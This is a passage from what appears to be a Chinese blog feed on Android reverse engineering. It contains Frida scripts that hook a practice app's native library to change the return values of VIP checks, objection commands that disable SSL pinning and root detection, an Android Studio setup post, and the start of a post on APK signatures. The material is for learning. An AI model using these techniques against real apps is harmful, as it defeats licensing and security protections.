function_">findModuleByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>).<span class="hljs-property">base</span>;  <br><span class="hljs-keyword">var</span> moduleAddr2 = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">getModuleByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>).<span class="hljs-property">base</span>;  <br><span class="hljs-keyword">var</span> moduleAddr3 = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="枚举导入导出表"><a class="markdownIt-Anchor" href="#枚举导入导出表"></a> 枚举导入导出表</h3><ol><li><strong>导出表（Export Table）</strong>：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称。</li><li><strong>导入表（Import Table）</strong>：列出了库需要从其他库中调用的函数和符号的名称。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//打印导入表</span><br>        <span class="hljs-keyword">var</span> imports = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImports</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i =<span class="hljs-number">0</span>; i &lt; imports.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(imports[i].<span class="hljs-property">name</span> == <span class="hljs-string">&quot;vip&quot;</span>)&#123;<span class="hljs-comment">//导入表包含关键字</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(imports[i])); <span class="hljs-comment">//通过JSON.stringify打印object数据</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(imports[i].<span class="hljs-property">address</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//打印导出表</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i =<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exports</span>.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-built_in">exports</span>[i]));<br>        &#125;<br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook为导出函数"><a class="markdownIt-Anchor" href="#hook为导出函数"></a> hook为导出函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest6</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印基址</span><br>        <span class="hljs-keyword">var</span> soAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(soAddr);<br>        <span class="hljs-keyword">var</span> funcaddr = soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1071C</span>);  <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(funcaddr);<br>        <span class="hljs-keyword">if</span>(funcaddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcaddr,&#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args参数</span><br><br>                &#125;,<br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval.<span class="hljs-title function_">toInt32</span>());<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里函数地址有所不同</p><ol><li>安卓里一般32 位的 so 中都是 <code>thumb</code> 指令，64 位的 so 中都是 <code>arm</code> 指令</li><li>通过IDA里的opcode bytes来判断，arm 指令为 4 个字节对齐，thumb 指令为 2 个字节对齐</li><li>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1<br />arm 指令，  函数地址计算方式： so 基址 + 函数在 so 中的偏移</li></ol><h3 id="hook-基本方法"><a class="markdownIt-Anchor" href="#hook-基本方法"></a> hook 基本方法</h3><h4 id="参数整型-布尔-char类型"><a class="markdownIt-Anchor" href="#参数整型-布尔-char类型"></a> 参数整型、布尔、char类型</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//根据导出函数名打印地址</span><br>    <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(helloAddr); <br>    <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-comment">//Interceptor.attach是Frida里的一个拦截器</span><br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>           <span class="hljs-comment">//onEnter里可以打印和修改参数</span><br>            <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args传入参数</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">0</span>]);  <span class="hljs-comment">//打印第一个参数的值</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>);  <span class="hljs-comment">// 打印寄存器内容</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">1</span>].<span class="hljs-title function_">toInt32</span>()); <span class="hljs-comment">//toInt32()转十进制</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">2</span>].<span class="hljs-title function_">readCString</span>()); <span class="hljs-comment">//读取字符串 char类型</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(args[<span class="hljs-number">2</span>])); <span class="hljs-comment">//内存dump</span><br>                args[<span class="hljs-number">0</span>] = <span class="hljs-title function_">ptr</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">//第一个参数修改为整数 1000，先转为指针再赋值</span><br><br>            &#125;,<br>            <span class="hljs-comment">//onLeave里可以打印和修改返回值</span><br>            <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">20000</span>);  <span class="hljs-comment">//返回值修改</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval);<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;retval&quot;</span>,retval.<span class="hljs-title function_">toInt32</span>());<br>            &#125;<br>        &#125;)<br>    &#125;<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="参数string类型"><a class="markdownIt-Anchor" href="#参数string类型"></a> 参数string类型</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印地址</span><br>        <span class="hljs-keyword">var</span> helloAddr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>,<span class="hljs-string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);<br>        <span class="hljs-keyword">if</span>(helloAddr != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(helloAddr,&#123;<br>                <span class="hljs-comment">//onEnter里可以打印和修改参数</span><br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;  <span class="hljs-comment">//args传入参数</span><br>                    <span class="hljs-comment">// 方法一读取</span><br>                    <span class="hljs-keyword">var</span> jString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(args[<span class="hljs-number">2</span>], <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;参数:&quot;</span>, jString.<span class="hljs-title function_">toString</span>());<br>                    <span class="hljs-comment">// 方法二读取</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> originalStrPtr = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">getStringUtfChars</span>(args[<span class="hljs-number">2</span>], <span class="hljs-literal">null</span>).<span class="hljs-title function_">readCString</span>();        <br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;参数:&quot;</span>, originalStrPtr);<br>                    <br>                    <span class="hljs-comment">//修改</span><br>                    <span class="hljs-keyword">var</span> newJString = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newStringUtf</span>(modifiedContent);<br>                args[<span class="hljs-number">2</span>] = newJString; <br>                &#125;,<br>                <span class="hljs-comment">//onLeave里可以打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;  <span class="hljs-comment">//retval返回值</span><br>                    <span class="hljs-keyword">var</span> returnedJString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(retval, <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;返回值:&quot;</span>, returnedJString.<span class="hljs-title function_">toString</span>());<br>                    <br>                    <span class="hljs-comment">//修改</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                <span class="hljs-keyword">var</span> modifiedContent = <span class="hljs-string">&quot;无敌&quot;</span>;<br>                <span class="hljs-keyword">var</span> newJString = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newStringUtf</span>(modifiedContent);<br>                retval.<span class="hljs-title function_">replace</span>(newJString);<br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-dlopen"><a class="markdownIt-Anchor" href="#hook-dlopen"></a> hook dlopen</h3><p>​dlopen主要加载库文件，在so加载之前被调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_dlopen</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> dlopen = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;dlopen&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(dlopen, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">var</span> so_name = args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();<br>            <span class="hljs-keyword">if</span> (so_name.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>) != -<span class="hljs-number">1</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span> = <span class="hljs-literal">true</span>;<br>        &#125;, <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span>) <span class="hljs-title function_">hookTest2</span>();<span class="hljs-comment">//这是是自己设置的hook函数，上文的hookTest2</span><br>        &#125;<br>    &#125;);<br>    <span class="hljs-comment">// 高版本Android系统使用android_dlopen_ext</span><br>    <span class="hljs-keyword">var</span> android_dlopen_ext = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;android_dlopen_ext&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(android_dlopen_ext, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">var</span> so_name = args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();<br>            <span class="hljs-keyword">if</span> (so_name.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;lib52pojie.so&quot;</span>) != -<span class="hljs-number">1</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span> = <span class="hljs-literal">true</span>;<br>        &#125;, <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span>) <span class="hljs-title function_">hookTest2</span>();<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="objection"><a class="markdownIt-Anchor" href="#objection"></a> objection</h1><h2 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">不再更新了，所以建议python版本为3.8</span><br>pip install objection==1.11.0<br>pip install frida-tools==9.2.4<br></code></pre></td></tr></table></figure><h2 id="基础使用"><a class="markdownIt-Anchor" href="#基础使用"></a> 基础使用</h2><h3 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">objection -g 包名 explore<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">help</span>：不知道当前命令的效果是什么，在当前命令前加<span class="hljs-built_in">help</span>比如：<span class="hljs-built_in">help</span> [<span class="hljs-built_in">command</span>]，回车之后会出现当前命令的解释信息</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">按空格：不知道输入什么就按空格，会有提示出来</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">jobs</span>：可以进行多项hook</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">日志：objection的日志文件生成在 C:\Users\Administrator\.objection</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动前hook，spawn模式</span><br>objection -g 进程名 explore --startup-command &quot;android hooking watch class 路径.类名&quot;<br></code></pre></td></tr></table></figure><h3 id="基础api"><a class="markdownIt-Anchor" href="#基础api"></a> 基础api</h3><ul><li><p><code>memory list modules</code></p><ul><li>查看内存中加载的库</li></ul></li><li><p><code>memory list exports so名称</code></p><ul><li>查看库的导出函数</li></ul></li><li><p><code>android intent launch_activity 类名</code></p><ul><li>启动<code>activity</code>或<code>service</code>(可以用于一些没有验证的activity,在一些简单的ctf中有时候可以出奇效)</li></ul></li><li><p><code>android sslpinning disable</code></p><ul><li>关闭ssl校验</li></ul></li><li><p><code>android root disable</code></p><ul><li>关闭root检测</li></ul></li></ul><h3 id="内存漫游"><a class="markdownIt-Anchor" href="#内存漫游"></a> 内存漫游</h3><p>​这里需要提前打开软件，才能在内存中存在</p><ul><li><code>android heap search instances 类名</code><ul><li>获得 HashCode</li></ul></li><li><code>android hooking list classes</code><ul><li>列举内存中所有的类</li></ul></li><li><code>android hooking search classes 类名</code><ul><li>在内存中所有已加载的类中搜索包含特定关键词的类</li></ul></li><li><code>android hooking list class_methods 类名</code><ul><li>内存漫游类中的所有方法</li></ul></li></ul><h3 id="hook"><a class="markdownIt-Anchor" href="#hook"></a> hook</h3><ul><li><code>android hooking watch class 类名</code><ul><li>hook所有方法</li></ul></li><li><code>android hooking watch class_method 类名.方法名 --dump-args --dump-return --dump-backtrace</code><ul><li>hook方法的参数，返回值，调用栈</li></ul></li><li><code>android hooking watch class_method 类名.$init</code><ul><li>hook构造函数</li></ul></li><li><code>android hooking watch class_method 类名.方法名</code><ul><li>hook方法的所有重载</li></ul></li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ul><li><p><a href="https://www.52pojie.cn/thread-1823118-1-1.html">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上) - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/Q8ajlXSetPf-5x_ytSDqlQ">https://mp.weixin.qq.com/s/Q8ajlXSetPf-5x_ytSDqlQ</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio配置</title>
    <link href="/posts/64c50d77.html"/>
    <url>/posts/64c50d77.html</url>
    
    <content type="html"><![CDATA[<h1 id="gradle下载配置"><a class="markdownIt-Anchor" href="#gradle下载配置"></a> Gradle下载配置</h1><p>​直接更换国内腾讯<a href="https://mirrors.cloud.tencent.com/gradle/">镜像源</a>，打开<code>gradle - wrapper -gradle-weapper.properties</code> 进行更改。然后点击 <code>Sync Now</code> 进行同步。参考-&gt; <a href="https://blog.csdn.net/Systemmax20/article/details/131343623">Android导入项目时Gradle下载速度慢\超时\失败解决方法_导入gradle项目特别慢-CSDN博客</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">#Sun Feb 25 20:22:32 GMT+08:00 2024<br>distributionBase=GRADLE_USER_HOME<br>distributionPath=wrapper/dists<br>distributionUrl=https\://mirrors.cloud.tencent.com/gradle/gradle-8.2-bin.zip # 这里就对应替换为腾讯的镜像地址<br>zipStoreBase=GRADLE_USER_HOME<br>zipStorePath=wrapper/dists<br></code></pre></td></tr></table></figure><p>​但是这样也是很慢，还是得等，有时候还会突然跑到源地址去下载，搞不明白。(后续补充：有时候改了国内源，然后停止加载zip文件，之后重试一下就快很多了)</p><h1 id="生成apk"><a class="markdownIt-Anchor" href="#生成apk"></a> 生成APK</h1><ul><li><code>build -&gt; Generate Signed Bundle or APK</code>：选择APK，然后创建key(注意需要路径完整)，之后再选择release即可</li></ul><h1 id="存储空间管理"><a class="markdownIt-Anchor" href="#存储空间管理"></a> 存储空间管理</h1><ul><li>移动 <code>.gradle</code> 到指定位置<ul><li><a href="https://www.cnblogs.com/tc310/p/16884368.html">将 .gradle文件 从C盘移动到D盘 - tc310 - 博客园 (cnblogs.com)</a>，这里同时还需要相应修改 <code>idea.plugins.path</code> 和 <code>idea.log.path</code></li></ul></li><li>移动 <code>.android</code> 到指定位置<ul><li><a href="https://blog.csdn.net/weixin_42768634/article/details/115142632">https://blog.csdn.net/weixin_42768634/article/details/115142632</a></li></ul></li></ul><h1 id="sd卡读写权限"><a class="markdownIt-Anchor" href="#sd卡读写权限"></a> SD卡读写权限</h1><p>对于低版本sdk，只需要以下权限即可(在AndroidManifest.xml中修改)，在manifest标签中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​而对于高版本的sdk，这里是34，则需要添加东西。新加入的在application标签中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.MANAGE_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br>    <br>android:requestLegacyExternalStorage=&quot;true&quot;<br></code></pre></td></tr></table></figure><h1 id="生成apk-2"><a class="markdownIt-Anchor" href="#生成apk-2"></a> 生成apk</h1><p>​本来生成的 <code>app-debug.apk</code> 在路径 <code>/app/build/outputs/apk/debug/</code> 下面，后面不知道出现了什么差错，这个文件转移到了 <code>/app/build/intermediates/apk/debug/</code> 目录下了。怀疑之后生成的release版本也会转移位置，这里先存疑。</p><h1 id="报错汇总"><a class="markdownIt-Anchor" href="#报错汇总"></a> 报错汇总</h1><ul><li><p>遇到问题 <code>Cannot use connection to Gradle distribution 'https://mirrors.cloud.tencent.com/gradle/gradle-8.2-bin.zip' as it has been stopped.</code></p><ul><li>这里直接关闭项目，再重新打开即可。</li></ul></li><li><p><code>Error running 'app': Default Activity not found</code></p><ul><li>这里修改 configuration，更改 Launch Options -&gt; <code>Launch:nothing</code></li><li><a href="https://blog.csdn.net/qq_36792930/article/details/91041904">android studio怎么运行没有activity的service、broadcastReceiver、cotentProvicer等_androidstudio 如何启动服务?-CSDN博客</a></li></ul></li><li><p>日志不能在 As 中显示</p><ul><li>检查算法助手有没有 hook 对应程序，如果存在，那么它好像开机自启，自动将日志捕获了。关闭应用 hook 就可以显示日志了</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门(2)</title>
    <link href="/posts/a5156944.html"/>
    <url>/posts/a5156944.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Apk签名专题</p></blockquote><h1 id="apk-签名"><a class="markdownIt-Anchor" href="#apk-签名"></a> Apk 签名</h1><h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><p>​通过对 Apk 进行签名，开发者可以证明对 Apk 的所有权和控制权，可用于安装和更新其应用。而在 Android 设备上的安装 Apk，如果是一个没有被签名的 Apk，则会被拒绝安装。在安装 Apk 的时候，软件包管理器也会验证 Apk 是否已经被正确签名，并且通过签名证书和数据摘要验证是否合法没有被篡改。只有确认安全无篡改的情况下，才允许安装在设备上。</p><p>简单来说，APK 的签名主要作用有两个：</p><ol><li><p>证明 APK 的所有者。</p></li><li><p>允许 Android 市场和设备校验 APK 的正确性。</p></li></ol><p>​Android 目前支持以下四种应用签名方案：</p><ul><li>v1 方案：基于 JAR 签名</li><li>v2 方案：APK 签名方案 v2(在 Android 7.0 中引入)</li><li>v3 方案：APK 签名方案 v3(在 Android 9 中引入)</li><li>v4 方案：APK 签名方案 v4(在 Android 11 中引入)</li></ul><h2 id="v1-签名"><a class="markdownIt-Anchor" href="#v1-签名"></a> V1 签名</h2><p>​V1 签名的机制主要就在 META-INF 目录下的三个文件，MANIFEST.MF，ANDROID.SF，ANDROID.RSA，他们都是 V1 签名的产物。在某些情况下，直接对apk进行v1签名可以绕过apk的签名校验(我认为直接覆盖了之前的签名文件)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402272330925.png" alt="image-20240227233002806" 